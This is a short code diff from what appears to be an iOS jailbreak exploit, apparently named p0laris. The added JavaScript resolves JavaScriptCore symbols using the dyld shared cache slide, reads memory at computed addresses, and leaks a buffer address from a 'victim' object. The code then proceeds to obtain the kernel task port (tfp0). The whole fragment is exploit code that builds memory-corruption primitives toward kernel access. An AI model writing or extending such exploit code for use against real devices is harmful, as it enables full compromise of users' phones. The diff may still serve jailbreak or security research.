@@ -12,6 +12,13 @@ var SOCK_DGRAM = 2;
 var SOCK_DGRAM = 2;
 var IPPROTO_UDP = 17;
 
+function prep_shit() {
+	string_ref = scall("JSStringCreateWithUTF8CString", "victim");
+	global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
+	jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
+	large_buf_ptr = leak_vec(large_buf);
+}
+
 function main() {
 	syslog(LOG_SYSLOG, "__p0laris_LOG_START__");
 	p0laris_log("[*] we out here");
@@ -23,6 +30,13 @@ function main() {
 //	printf = p0laris_log;
 
 	printf("test");
+
+	var dyld_shc_slide = get_dyld_shc_slide();
+
+	sym_cache["JSStringCreateWithUTF8CString"] = JSStringCreateWithUTF8CString + dyld_shc_slide;
+	sym_cache["JSObjectGetProperty"] = JSObjectGetProperty + dyld_shc_slide;
+	sym_cache["JSContextGetGlobalObject"] = JSContextGetGlobalObject + dyld_shc_slide;
+	prep_shit();
 
 	var tfp0 = get_kernel_task();
 
